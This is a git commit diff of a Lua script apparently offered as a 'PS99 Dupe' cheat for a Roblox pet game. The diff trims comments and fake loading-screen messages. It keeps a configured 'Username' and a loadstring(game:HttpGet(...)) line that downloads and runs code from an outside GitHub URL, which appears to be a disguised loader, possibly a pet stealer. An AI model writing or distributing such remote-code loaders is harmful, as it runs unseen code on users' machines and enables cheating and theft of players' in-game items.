cd91b1a5f28d7340ff93f5f5b7f0bf63fa803f0a
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2024-01-02 20:10:26 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,11 +1,4 @@
 Username = "loadstping"
-loadingscreen = true
-farmui = true -- set to false if u dont want to load it
---below only if loadingscreen = true
-_G.CustomScriptName = "PS99 Dupe" -- Main text 
-_G.Text1 = "Script Loaded..." --tip test1
-_G.Text2 = "Waiting for Script" --tip test1
-_G.Text3 = "Checking Scripts..." --tip test1
-_G.Text4 = "Starting Scripts..." --tip test1
-
+loadingscreen = true 
+farmui = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
